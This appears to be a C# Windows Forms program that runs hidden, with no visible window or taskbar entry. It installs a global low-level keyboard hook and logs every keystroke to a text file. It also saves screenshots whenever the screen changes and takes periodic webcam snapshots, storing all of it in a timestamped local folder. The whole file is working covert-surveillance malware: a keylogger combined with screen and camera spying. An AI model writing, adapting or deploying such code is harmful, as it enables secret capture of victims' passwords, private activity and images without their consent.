using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using AForge;
using System.Diagnostics;
using OpenCvSharp;
using OpenCvSharp.Extensions;


namespace System
{
    public partial class Form1 : Form
    {
        int n = 50;
        int lastFrami;
        FilterInfoCollection videodevices;
        int tik = 0;
        public Form1()
        {
            InitializeComponent();
            i = 0;
            g = 0;
            lastFrame = null;
            try
            {
                videodevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                cam = new VideoCaptureDevice(videodevices[0].MonikerString);
                //cam = new VideoCaptureDevice();
                cam.NewFrame += Cam_NewFrame;
            }
            catch { }  
            
            m = new ScreenCaptureStream(Screen.PrimaryScreen.Bounds);
            m.NewFrame += M_NewFrame;
            lastFrami = -n;
            home =  @"D:\Программы\OpenSUSe";//File.ReadAllLines("C:\\path.txt")[0];
            string time = DateTime.Now + "";
            time = time.Replace(":", ".");
            Directory.CreateDirectory(home + "\\" + time);
            home=home+ "\\" + time;
             sw = home + "\\key.txt";
            timer1.Start();
            Hoook.StartHook();
           

        }
        int g;
        string sw;

        private void Cam_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (g-lastFrami >n)
            {
                string time = DateTime.Now + "";
                time = time.Replace(":", ".");
                eventArgs.Frame.Save(home + "\\camera" + time + ".png");
                lastFrami = g;
            }
            g++;
        }

        int i ;
        ScreenCaptureStream m;
        VideoCaptureDevice cam;
        private void Form1_Load(object sender, EventArgs e)
        {

            
            m.Start();
            try
            {
                cam.Start();
            }
            catch { }
            ShowInTaskbar = false;
            Hide();



        }
        string home;

        private void M_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            if (lastFrame == null)
            {
                string time = DateTime.Now + "";
                time = time.Replace(":", ".");
                eventArgs.Frame.Save(home+"\\Screen" + time + ".png");
                i++;
               
                lastFrame =eventArgs.Frame.ToIplImage();
            }
            else
            {
                IplImage frame = eventArgs.Frame.ToIplImage();
                IplImage diff = frame.Clone();
                Cv.AbsDiff(frame,lastFrame, diff);
                CvScalar sc = diff.Sum();
               if(sc.Val0>10000)
                {
                    string time = DateTime.Now + "";
                    time = time.Replace(":", ".");
                    eventArgs.Frame.Save(home + "\\Screen" + time + ".png");
                    i++;
                    lastFrame = frame;
                }
            }

        }

        IplImage lastFrame;
        private void button1_Click(object sender, EventArgs e)
        {
           
        }

        private void button2_Click(object sender, EventArgs e)
        {
            m.Stop();
            cam.Stop();
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            File.AppendAllText(sw, Convert.ToString(e.KeyData));

        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            tik += timer1.Interval;
            if(tik>5000)
            {
                tik = 0;
                if(Hoook.lb.Length>0)
                {
                    string str = Hoook.lb.ToString();
                    Hoook.lb = new StringBuilder();
                    File.AppendAllText(sw,str  +"-"+DateTime.Now+ "\n");
                    Hoook.lb = new StringBuilder();
                }
            }
        }
    }


    public static class Hoook
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevel_KeyboardProc Ipfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        private static IntPtr _hookId = IntPtr.Zero;
        private delegate IntPtr LowLevel_KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevel_KeyboardProc _proc = HookCallback;
        private const int WH_KEYBOARD_LL = 13;
        private const int WH_KEYDOWN = 0x0100;

        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static IntPtr SetHook(LowLevel_KeyboardProc proc)
        {
            Process pr = Process.GetCurrentProcess();
            ProcessModule prM = pr.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(prM.ModuleName), 0);
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WH_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                InputLanguage inlen = InputLanguage.CurrentInputLanguage;
                
                
                    lb.Append((Keys)vkCode);
                

            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }
        public static void StartHook()
        {
            _hookId = SetHook(_proc);
            lb = new StringBuilder();
        }
        public static void StopHook()
        {
            UnhookWindowsHookEx(_hookId);
        }
        public static StringBuilder lb;
        private static string GetRuSymbol(int code)
        {
            
                Keys inp = (Keys)(code);
            return inp.ToString();

            
        }

    }

}
